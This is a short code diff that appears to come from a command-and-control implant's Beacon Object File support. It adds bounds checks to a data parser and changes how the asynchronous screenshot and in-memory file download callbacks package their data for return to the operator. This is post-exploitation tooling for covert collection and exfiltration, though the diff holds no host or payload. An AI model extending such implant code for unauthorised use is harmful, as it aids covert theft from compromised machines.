@@ -70,13 +70,19 @@ unsigned int swap_endianess(unsigned int indata)
 
 void BeaconDataParse(datap* parser, char* buffer, int size)
 {
-	if (parser == NULL || buffer == NULL)
+	if (parser == NULL)
+		return;
+
+	parser->original = buffer;
+	parser->buffer   = buffer;
+	parser->length   = 0;
+	parser->size     = 0;
+
+	if (buffer == NULL || size < 4)
 		return;
 	
-	parser->original = buffer;
-	parser->buffer = buffer;
 	parser->length = size - 4;
-	parser->size = size - 4;
+	parser->size   = size - 4;
 	parser->buffer += 4;
 }
 
@@ -510,7 +516,13 @@ BOOL proxy_FreeLibrary(HMODULE hLibModule)
 void AxAddScreenshot(char* note, char* data, int len)
 {
 	if (IsAsyncBofThread()) {
-		AsyncBofOutput(CALLBACK_AX_SCREENSHOT, (PBYTE)data, len);
+		Packer* tmp = Packer_Create();
+		if (tmp) {
+			Packer_PackStringA(tmp, note);
+			Packer_PackBytes(tmp, (PBYTE)data, len);
+			AsyncBofOutput(CALLBACK_AX_SCREENSHOT, Packer_data(tmp), Packer_datasize(tmp));
+			Packer_Destroy(tmp);
+		}
 		return;
 	}
 	if (bofOutputPacker) {
@@ -525,7 +537,13 @@ void AxAddScreenshot(char* note, char* data, int len)
 void AxDownloadMemory(char* filename, char* data, int len)
 {
 	if (IsAsyncBofThread()) {
-		AsyncBofOutput(CALLBACK_AX_DOWNLOAD_MEM, (PBYTE)data, len);
+		Packer* tmp = Packer_Create();
+		if (tmp) {
+			Packer_PackStringA(tmp, filename);
+			Packer_PackBytes(tmp, (PBYTE)data, len);
+			AsyncBofOutput(CALLBACK_AX_DOWNLOAD_MEM, Packer_data(tmp), Packer_datasize(tmp));
+			Packer_Destroy(tmp);
+		}
 		return;
 	}
 	if (bofOutputPacker) {
